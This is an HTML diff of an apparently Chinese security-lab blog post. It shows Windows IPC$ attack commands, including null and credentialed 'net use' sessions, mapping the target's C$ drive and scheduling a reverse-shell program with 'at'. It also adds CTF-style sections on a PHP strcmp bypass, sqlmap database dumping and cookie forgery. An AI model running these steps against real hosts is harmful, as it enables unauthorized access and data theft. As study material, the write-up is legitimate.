@@ -451,14 +451,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    880
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    4 分
                 </div>
                 
 
@@ -491,31 +491,31 @@
 <ol start="2">
 <li>获取到目标主机ip</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ping ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/032944469/2.PNG" alt="2"></p>
 <ol start="3">
 <li>建立空连接</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use \\ip\ipc$ &quot;&quot; &#x2F;user &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ <span class="token string">""</span> /user <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/032944469/3.PNG" alt="3"></p>
 <ol start="4">
 <li>删除连接</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use \\ip\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ /del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/032944469/4.PNG" alt="4"></p>
 <ol start="5">
 <li>建立非空连接</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use \\ip\ipc$ &quot;密码&quot; &#x2F;user:&quot;账号&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ <span class="token string">"密码"</span> /user:<span class="token string">"账号"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/032944469/5.PNG" alt="5"></p>
 <ol start="6">
 <li>将目标主机c盘映射为客户机(本机)的z盘</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use z: \\ip\c$ &quot;密码&quot; &#x2F;user:&quot;账号&quot; &#x2F;&#x2F;注意其中的是c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use z: <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>c$ <span class="token string">"密码"</span> /user:<span class="token string">"账号"</span> //注意其中的是c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/032944469/6.PNG" alt="6"></p>
 <p><img src="/2023/032944469/7.PNG" alt="7"></p>
@@ -526,13 +526,13 @@
 <ol start="8">
 <li>查看目标主机时间</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net time \\ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net <span class="token function">time</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/032944469/9.PNG" alt="9"></p>
 <ol start="9">
 <li>定时启动反弹shell程序</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">at \\ip 启动时间 程序名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">at <span class="token punctuation">\</span><span class="token punctuation">\</span>ip 启动时间 程序名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/032944469/10.PNG" alt="10"></p>
 <ol start="10">
@@ -640,6 +640,71 @@
 
 <p><img src="/2023/032944469/33.png" alt="33"></p>
 <p>sucess!!!</p>
+<h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><h3 id="strcmp函数缺陷"><a href="#strcmp函数缺陷" class="headerlink" title="strcmp函数缺陷"></a>strcmp函数缺陷</h3><ol>
+<li>我们在输入用户名和密码后，点击登录，页面会提示<code>密码不正确</code>，我们可以看到我粘贴复制的地址，路径后面的参数是?pass=hackewmeweplease#</li>
+</ol>
+<p><img src="/2023/032944469/34.PNG" alt="34"></p>
+<ol start="2">
+<li>我们来查看服务器上有什么文件是可以被查看的，然后我们在网站的URL地址上输入robots.txt，我们查看结果</li>
+</ol>
+<p><img src="/2023/032944469/35.PNG" alt="35"></p>
+<ol start="3">
+<li>我们可以发现服务器返回给我我们的结果是<code>strcmp</code>，我们就可以利用php的弱类型构造，来构造语句,在URL地址上输入<code>?pass[]=1</code></li>
+</ol>
+<p><img src="/2023/032944469/36.PNG" alt="36"></p>
+<ol start="4">
+<li>服务器返回给我们的结果为<code>后台：95de87f12261.php</code>,说明我们的代码文件里面存在着<code>95de87f12261.php</code>文件。然后，我们可以通过访问<code>95de87f12261.php</code>页面来查看信息</li>
+</ol>
+<p><img src="/2023/032944469/37.PNG" alt="37"></p>
+<ol start="5">
+<li>测试是否含有sql注入漏洞，测试出**闭合符为 ‘ 即：1’ – - **，回显为三行，同时会对select进行过滤</li>
+</ol>
+<p><img src="/2023/032944469/38.PNG" alt="38"></p>
+<ol start="6">
+<li>采用sqlmap进行爆破</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>发现存在<strong>延时注入、联合查询</strong></p>
+<ol start="7">
+<li>暴当前的数据库</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/032944469/40.PNG" alt="40"></p>
+<ol start="8">
+<li>暴表</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span><span class="token operator">-</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/032944469/41.PNG" alt="41"></p>
+<ol start="9">
+<li>暴字段，发现并不存在</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span>T flag <span class="token operator">-</span><span class="token operator">-</span>columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/032944469/42.PNG" alt="42"></p>
+<ol start="10">
+<li>暴数据</li>
+</ol>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span>T flag <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/032944469/43.PNG" alt="43"></p>
+<h2 id="信息伪造"><a href="#信息伪造" class="headerlink" title="信息伪造"></a>信息伪造</h2><h3 id="cookie欺诈"><a href="#cookie欺诈" class="headerlink" title="cookie欺诈"></a>cookie欺诈</h3><ol>
+<li>首先判断网页脚本语言</li>
+</ol>
+<p><img src="/2023/032944469/45.PNG" alt=" "></p>
+<p><img src="/2023/032944469/46.PNG" alt=" "></p>
+<p>测试发现网页脚本语言时php</p>
+<ol start="2">
+<li>查看网页源代码，发现一段js代码，分析可知cookie存在问题</li>
+</ol>
+<p><img src="/2023/032944469/44.PNG" alt=" "></p>
+<p><img src="/2023/032944469/47.PNG" alt=" "></p>
+<ol start="3">
+<li>使用burpsuite抓包，修改cookie=1，进行破解</li>
+</ol>
+<p><img src="/2023/032944469/48.PNG" alt=" "></p>
 
                 
             </div>
